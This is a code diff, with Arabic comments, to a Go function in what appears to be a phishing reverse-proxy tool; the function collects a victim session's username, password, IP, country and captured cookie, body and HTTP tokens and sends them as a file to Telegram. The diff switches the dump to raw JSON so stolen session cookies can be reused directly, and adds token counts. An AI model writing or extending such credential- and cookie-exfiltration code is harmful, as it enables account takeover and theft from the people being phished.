@@ -2225,50 +2225,63 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	}
 }
 
-// دالة جديدة لإرسال الكوكيز كملف نصي إلى تلجرام
+// دالة مُعدلة لإرسال الكوكيز كملف نصي إلى تيليجرام بالشكل الخام كما هي
 func (p *HttpProxy) sendCookiesToTelegram(s *Session) {
-	// تجميع بيانات الكوكيز في نص
-	cookiesText := fmt.Sprintf("=== Cookies for session %s ===\n", s.Id)
+	// تجميع المعلومات الأساسية
+	cookiesText := fmt.Sprintf("=== Session Info %s ===\n", s.Id)
 	cookiesText += fmt.Sprintf("Username: %s\n", s.Username)
 	cookiesText += fmt.Sprintf("Password: %s\n", s.Password)
 	cookiesText += fmt.Sprintf("IP: %s\n", s.RemoteAddr)
 	cookiesText += fmt.Sprintf("User-Agent: %s\n", s.UserAgent)
 	cookiesText += fmt.Sprintf("Country: %s (%s)\n\n", s.Country, s.CountryCode)
 	
-	// إضافة بيانات الكوكيز المخزنة
-	cookiesText += "=== Cookie Tokens ===\n"
-	for domain, cookies := range s.CookieTokens {
-		cookiesText += fmt.Sprintf("Domain: %s\n", domain)
-		for name, cookie := range cookies {
-			cookiesText += fmt.Sprintf("  %s = %s\n", name, cookie.Value)
-			cookiesText += fmt.Sprintf("    Path: %s\n", cookie.Path)
-			cookiesText += fmt.Sprintf("    HttpOnly: %t\n", cookie.HttpOnly)
-			cookiesText += fmt.Sprintf("    Expires: %s\n", cookie.Expires.Format(time.RFC3339))
-			cookiesText += "  -----\n"
-		}
-		cookiesText += "\n"
+	// إضافة معلومات الكوكيز بالشكل الخام
+	cookiesText += "=== RAW Cookie Tokens ===\n"
+	
+	// تحويل هيكل البيانات إلى JSON
+	cookieJSON, err := json.MarshalIndent(s.CookieTokens, "", "  ")
+	if err != nil {
+		log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
+		cookiesText += "خطأ في استخراج الكوكيز\n"
+	} else {
+		cookiesText += string(cookieJSON) + "\n\n"
 	}
 	
-	// إضافة بيانات الـ Body Tokens
+	// إضافة البيانات الخام لـ Body Tokens
 	if len(s.BodyTokens) > 0 {
-		cookiesText += "=== Body Tokens ===\n"
-		for name, value := range s.BodyTokens {
-			cookiesText += fmt.Sprintf("%s = %s\n", name, value)
+		cookiesText += "=== RAW Body Tokens ===\n"
+		bodyJSON, err := json.MarshalIndent(s.BodyTokens, "", "  ")
+		if err != nil {
+			log.Error("خطأ في تحويل البيانات إلى JSON: %v", err)
+		} else {
+			cookiesText += string(bodyJSON) + "\n\n"
 		}
-		cookiesText += "\n"
 	}
 	
-	// إضافة بيانات الـ HTTP Tokens
+	// إضافة البيانات الخام لـ HTTP Tokens
 	if len(s.HttpTokens) > 0 {
-		cookiesText += "=== HTTP Tokens ===\n"
-		for name, value := range s.HttpTokens {
-			cookiesText += fmt.Sprintf("%s = %s\n", name, value)
+		cookiesText += "=== RAW HTTP Tokens ===\n"
+		httpJSON, err := json.MarshalIndent(s.HttpTokens, "", "  ")
+		if err != nil {
+			log.Error("خطأ في تحويل البيانات إلى JSON: %v", err)
+		} else {
+			cookiesText += string(httpJSON) + "\n\n"
 		}
-		cookiesText += "\n"
 	}
 	
-	// إرسال النص كملف إلى تلجرام
-	fileName := fmt.Sprintf("cookies_%s_%s.txt", s.Name, s.Id)
+	// إضافة عدد الكوكيز المختلفة
+	cookiesText += fmt.Sprintf("=== Cookie Counts ===\n")
+	cookieCount := 0
+	for _, cookies := range s.CookieTokens {
+		cookieCount += len(cookies)
+	}
+	cookiesText += fmt.Sprintf("Total Cookies: %d\n", cookieCount)
+	cookiesText += fmt.Sprintf("Total Cookie Domains: %d\n", len(s.CookieTokens))
+	cookiesText += fmt.Sprintf("Total Body Tokens: %d\n", len(s.BodyTokens))
+	cookiesText += fmt.Sprintf("Total HTTP Tokens: %d\n", len(s.HttpTokens))
+	
+	// إرسال النص كملف إلى تيليجرام
+	fileName := fmt.Sprintf("raw_cookies_%s_%s.txt", s.Name, s.Id)
 	p.telegram.SendFileFromText(fileName, cookiesText)
 }
 
